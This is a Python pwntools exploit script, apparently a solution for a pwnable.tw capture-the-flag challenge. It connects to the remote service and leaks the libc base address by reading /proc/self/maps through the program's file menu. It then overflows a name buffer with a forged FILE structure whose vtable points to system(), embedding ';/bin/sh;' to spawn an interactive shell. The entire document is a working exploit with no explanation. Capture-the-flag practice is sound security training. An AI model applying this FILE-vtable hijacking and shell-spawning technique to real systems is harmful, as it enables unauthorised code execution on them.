from pwn import *

PROG = './chal'
EXE = ELF(PROG)
LIBC = ELF('libc_32.so.6')
db = """
"""

### ------------------ EXPLOIT ------------------ ###

r = remote('chall.pwnable.tw', 10200)

def mopen(filename):
    r.sendlineafter('choice :', b'1')
    r.sendlineafter(b'see :', filename)

def mread():
    r.sendlineafter('choice :', b'2')

def mwrite():
    r.sendlineafter('choice :', b'3')

def mclose():
    r.sendlineafter('choice :', b'4')

def mexit(name):
    r.sendlineafter('choice :', b'5')
    r.sendlineafter(b'name :', name)

# leak libc by reading /proc/self/map
mopen(b'/proc/self/maps')
mread()
mwrite()
mread()
mwrite()

line = r.recvline()
while line and b'libc' not in line:
    line = r.recvline()

LIBC.address = int(line[:8].decode('utf-8'), 16)
log.info('Leaked libc base: ' + hex(LIBC.address))

# create fake FILE that overwrites vtable for arbitrary execution
pay = p32(0xFFFFDFFF) + b';/bin/sh;' + (b'A' * (28-9))
pay += p32(EXE.symbols['name'])     # fp = name
pay += (b'B' * (10*4)) + p32(0x804b2b0)
pay += p32(EXE.symbols['name'] + 0x100)     # fp->_lock = some valid ptr
pay += p32(EXE.symbols['name'] + (23-17)*4) # fp->_vtable
pay += p32(LIBC.symbols['system'])

#gdb.attach(r, "b *0x08048afa\nc")
mexit(pay)

r.interactive()
